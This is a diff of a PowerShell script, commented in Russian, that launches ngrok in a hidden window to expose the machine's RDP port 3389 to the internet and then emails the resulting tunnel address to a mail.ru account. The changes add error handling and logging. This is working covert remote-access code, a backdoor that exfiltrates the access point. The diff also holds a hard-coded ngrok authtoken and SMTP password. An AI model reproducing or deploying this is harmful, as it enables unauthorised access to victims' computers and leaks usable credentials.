@@ -64,8 +64,12 @@ authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
     }
 }
 
-Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden
-Log "Ngrok запущен"
+try {
+    Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden
+    Log "Ngrok запущен"
+} catch {
+    Log "Ошибка при запуске ngrok: $_"
+}
 
 $tunnelAddress = $null
 for ($i = 0; $i -lt 30; $i++) {
@@ -82,11 +86,13 @@ for ($i = 0; $i -lt 30; $i++) {
     }
 }
 
-# Независимо от tunnelAddress, шлём лог
+Log "Полученный tunnelAddress: $tunnelAddress"
+
+# Параметры отправки email через Mail.ru
 $smtpServer = "smtp.mail.ru"
 $smtpPort   = 587
 $smtpUser   = "user.default00@mail.ru"
-$smtpPass   = "DggLc7dSWENCbM56151O"
+$smtpPass   = "DggLc7dSWENCbM56151O"  # <-- здесь укажи пароль приложения
 
 $fromEmail = $smtpUser
 $toEmail   = "user.default00@mail.ru"
@@ -98,6 +104,7 @@ $body      = if ($tunnelAddress) {
 }
 
 try {
+    Log "Попытка отправки email"
     $cred = New-Object System.Management.Automation.PSCredential(
         $smtpUser,
         (ConvertTo-SecureString $smtpPass -AsPlainText -Force)
@@ -116,3 +123,5 @@ try {
 } catch {
     Log "Ошибка при отправке email: $_"
 }
+
+Log "Скрипт завершён"
